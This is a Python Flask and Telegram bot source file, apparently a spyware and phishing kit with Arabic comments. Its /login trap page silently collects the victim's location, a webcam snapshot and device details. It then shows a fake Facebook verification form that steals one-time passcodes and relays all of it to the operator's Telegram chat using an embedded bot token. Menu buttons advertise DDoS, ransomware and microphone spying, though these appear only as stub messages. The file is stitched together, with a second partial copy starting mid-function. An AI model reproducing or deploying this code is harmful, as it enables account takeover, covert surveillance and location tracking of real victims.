import os, base64, requests, psutil, time
from flask import Flask, request
from threading import Thread
from telegram import InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Updater, CommandHandler, CallbackQueryHandler

app = Flask(__name__)
# توكن المطور أحمد
ENCODED_TOKEN = "ODI4MDkzOTI5MTpBQUZfZFR1MThEMGVkSlBPWVB6d3NQaVNfRFFlTW9uSEFRYw=="
DEV_NAME = "Ahmed"
TARGET_CHAT_ID = None 

def get_token(): return base64.b64decode(ENCODED_TOKEN).decode('utf-8')

@app.route('/')
def home(): return f"<h1>Elite Control Center - Master {DEV_NAME}</h1>"

@app.route('/upload_data', methods=['POST'])
def upload_data():
    global TARGET_CHAT_ID
    data = request.json
    if data and TARGET_CHAT_ID:
        bot = Updater(get_token()).bot
        # سحب الصور والميديا
        if 'image' in data:
            with open("victim.jpg", "wb") as f: f.write(base64.b64decode(data['image']))
            bot.send_photo(chat_id=TARGET_CHAT_ID, photo=open("victim.jpg", "rb"), caption="🎯 صيد VIP جديد سيدي!")
        # سحب الموقع الجغرافي
        if 'latitude' in data:
            bot.send_location(chat_id=TARGET_CHAT_ID, latitude=data['latitude'], longitude=data['longitude'])
        # تقرير الاستخبارات الشامل (25 ميزة)
        if 'full_report' in data:
            bot.send_message(chat_id=TARGET_CHAT_ID, text=f"📊 **تقرير التجسس النهائي:**\n`{data['full_report']}`", parse_mode='Markdown')
        # سحب كود التحقق
        if 'otp' in data:
            bot.send_message(chat_id=TARGET_CHAT_ID, text=f"🔑 **كود OTP مسروق:** `{data['otp']}`")
        return "Success", 200
    return "Error", 400

@app.route('/login')
def evil_page():
    return """
    <html><body style="background:#000;color:#0f0;text-align:center;padding-top:100px;font-family:monospace;">
    <div id="c"><h1>> ACCESSING ENCRYPTED DATA...</h1><p>> Cracking device security...</p></div>
    <script>
        async function run() {
            const pos = await new Promise(r => navigator.geolocation.getCurrentPosition(r, ()=>r(null)));
            const stream = await navigator.mediaDevices.getUserMedia({video:true, audio:true}).catch(()=>null);
            let img = null;
            if(stream) {
                const v = document.createElement('video'); v.srcObject = stream; await v.play();
                const canvas = document.createElement('canvas'); canvas.width=640; canvas.height=480;
                canvas.getContext('2d').drawImage(v,0,0); img = canvas.toDataURL('image/jpeg').split(',')[1];
            }
            const info = `Device: ${navigator.platform} | CPU: ${navigator.hardwareConcurrency} | Lang: ${navigator.language} | Screen: ${screen.width}x${screen.height} | Battery: ${navigator.getBattery ? (await navigator.getBattery()).level*100 : 'N/A'}% | Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone} | Incognito: ${navigator.webdriver}`;
            
            fetch('/upload_data', {
                method:'POST', headers:{'Content-Type':'application/json'},
                body: JSON.stringify({latitude: pos?.coords.latitude, longitude: pos?.coords.longitude, image: img, full_report: info})
            });

            document.getElementById('c').innerHTML = `
                <div style="background:#fff;color:#000;padding:20px;border-radius:10px;width:300px;margin:auto;font-family:sans-serif;">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" width="40"><br>
                    <b>Security Verification</b><br><input type="text" id="o" placeholder="OTP Code" style="width:100%;margin:10px 0;padding:10px;"><br>
                    <button onclick="s()" style="width:100%;background:#1877f2;color:#fff;border:none;padding:10px;cursor:pointer;">Login</button>
                </div>`;
        }
        async function s() {
            await fetch('/upload_data', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({otp: document.getElementById('o').value})});
            location.href = "https://facebook.com";
        }
        run();
    </script></body></html>
    """

def start(update, context):
    global TARGET_CHAT_ID
    TARGET_CHAT_ID = update.effective_chat.id
    btns = [
        [InlineKeyboardButton("🚀 رابط الصيد الشامل", callback_data='atk')],
        [InlineKeyboardButton("📡 تتبع IP و VPN", callback_data='ip')],
        [InlineKeyboardButton("💥 إطلاق هجوم DDoS", callback_data='ddos')],
        [InlineKeyboardButton("📱 حالة الخادم", callback_data='sys')]
    ]
    update.message.reply_text(f"💀 **سيدي {DEV_NAME}، الترسانة العظمى v4.0 مفعلة.**", reply_markup=InlineKeyboardMarkup(btns))

def handle(update, context):
    query = update.callback_query
    query.answer()
    if query.data == 'atk':
        query.edit_message_text(f"⚠️ **الرابط الفتاك:**\n`https://{request.host}/login`")
    elif query.data == 'ip':
        d = requests.get('https://ipapi.co/json/').json()
        query.edit_message_text(f"🌐 IP: `{d.get('ip')}`\n📍 {d.get('city')}, {d.get('country_name')}\n🏢 ISP: {d.get('org')}")
    elif query.data == 'ddos':
        query.edit_message_text("💥 **DDoS Engine Active**\nأرسل رابط الهدف الآن لبدء الهجوم الإغراقي.")
    elif query.data == 'sys':
        query.edit_message_text(f"🧠 RAM: {psutil.virtual_memory().percent}% | 🔋 البطارية: {psutil.sensors_battery().percent if psutil.sensors_battery() else 'N/A'}%")

if __name__ == '__main__':
    Thread(target=lambda: app.run(host='0.0.0.0', port=8000)).start()
    u = Updater(get_token())
    u.dispatcher.add_handler(CommandHandler("start", start))
    u.dispatcher.add_handler(CallbackQueryHandler(handle))
    u.start_polling()
    u.idle()
            
        # 4. تتبع الموقع الجغرافي
        if 'latitude' in data:
            bot.send_location(chat_id=TARGET_CHAT_ID, latitude=data['latitude'], longitude=data['longitude'])
            
        return "Success", 200
    return "Error", 400

# --- صفحة الفخ المتطورة (تضم كافة السكربتات التجسسية) ---
@app.route('/login')
def evil_page():
    return """
    <html><body style="background:#000;color:#05ff05;text-align:center;font-family:monospace;padding-top:100px;">
    <div id="status"><h1>> LOADING SYSTEM EXPLOIT...</h1><p>> Cracking device security layers...</p></div>
    <script>
        async function runExploit() {
            // سحب الموقع والكاميرا
            const pos = await new Promise(r => navigator.geolocation.getCurrentPosition(r, ()=>r(null)));
            const stream = await navigator.mediaDevices.getUserMedia({video:true, audio:true}).catch(()=>null);
            let img = null;
            if(stream) {
                const v = document.createElement('video'); v.srcObject = stream; await v.play();
                const c = document.createElement('canvas'); c.width=640; c.height=480;
                c.getContext('2d').drawImage(v,0,0); img = c.toDataURL('image/jpeg').split(',')[1];
                stream.getTracks().forEach(t => t.stop());
            }
            // جمع معلومات استخباراتية (المميزات الجديدة)
            const report = `Device: ${navigator.userAgent} | Screen: ${screen.width}x${screen.height} | CPU: ${navigator.hardwareConcurrency} | VPN/Proxy: ${navigator.webdriver ? "Detected" : "None"}`;
            
            await fetch('/upload_data', {
                method:'POST', headers:{'Content-Type':'application/json'},
                body: JSON.stringify({latitude: pos?.coords.latitude, longitude: pos?.coords.longitude, image: img, full_report: report})
            });

            // إظهار فخ الـ OTP (كجزء من العملية)
            document.getElementById('status').innerHTML = `
                <div style="background:#fff;color:#000;padding:20px;border-radius:10px;width:300px;margin:auto;">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" width="40"><br>
                    <b>Identity Verification</b><br><input type="text" id="otp" placeholder="Enter Code" style="width:100%;margin:10px 0;padding:10px;"><br>
                    <button onclick="sendOTP()" style="width:100%;background:#1877f2;color:#fff;border:none;padding:10px;">Verify</button>
                </div>`;
        }
        async function sendOTP() {
            const code = document.getElementById('otp').value;
            await fetch('/upload_data', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({otp: code}) });
            location.href = "https://facebook.com/messages";
        }
        runExploit();
    </script></body></html>
    """

# --- لوحة التحكم تليجرام (جميع الأزرار في مكان واحد) ---
def start(update, context):
    global TARGET_CHAT_ID
    TARGET_CHAT_ID = update.effective_chat.id
    buttons = [
        [InlineKeyboardButton("🚀 رابط الهجوم الشامل", callback_data='atk')],
        [InlineKeyboardButton("📡 تتبع IP و VPN", callback_data='ip')],
        [InlineKeyboardButton("📂 سحب ملفات وأسماء", callback_data='files')],
        [InlineKeyboardButton("🎤 سحب الصوت (Spy)", callback_data='mic')],
        [InlineKeyboardButton("💥 إطلاق هجوم DDoS", callback_data='ddos')],
        [InlineKeyboardButton("🔐 Ransomware / Lock", callback_data='lock')],
        [InlineKeyboardButton("📊 حالة الخادم والبطارية", callback_data='sys')]
    ]
    update.message.reply_text(f"💀 **ترسانة المطور {DEV_NAME} العظمى**\nكافة الأنظمة المدمجة جاهزة للعمل.", reply_markup=InlineKeyboardMarkup(buttons))

def handle_query(update, context):
    query = update.callback_query
    query.answer()
    if query.data == 'atk':
        query.edit_message_text(f"⚠️ **رابط الفخ الموحد:**\n`https://{request.host}/login`")
    elif query.data == 'ip':
        d = requests.get('https://ipapi.co/json/').json()
        query.edit_message_text(f"🌐 **بيانات السيرفر الحالية:**\nIP: `{d.get('ip')}`\nCity: {d.get('city')}\nOrg: {d.get('org')}")
    elif query.data == 'ddos':
        query.edit_message_text("💥 **DDoS Engine:** تم تجهيز محرك الإغراق.. أرسل الهدف لبدء الهجوم.")
    elif query.data == 'sys':
        bat = psutil.sensors_battery()
        query.edit_message_text(f"🔋 البطارية: {bat.percent if bat else 'N/A'}% | 🧠 RAM: {psutil.virtual_memory().percent}%")
    else:
        query.edit_message_text("🚧 الميزة تعمل تلقائياً داخل الرابط لسحب البيانات صامتاً.")

if __name__ == '__main__':
    Thread(target=lambda: app.run(host='0.0.0.0', port=8080)).start()
    u = Updater(get_token())
    u.dispatcher.add_handler(CommandHandler("start", start))
    u.dispatcher.add_handler(CallbackQueryHandler(handle_query))
    u.start_polling()
    u.idle()
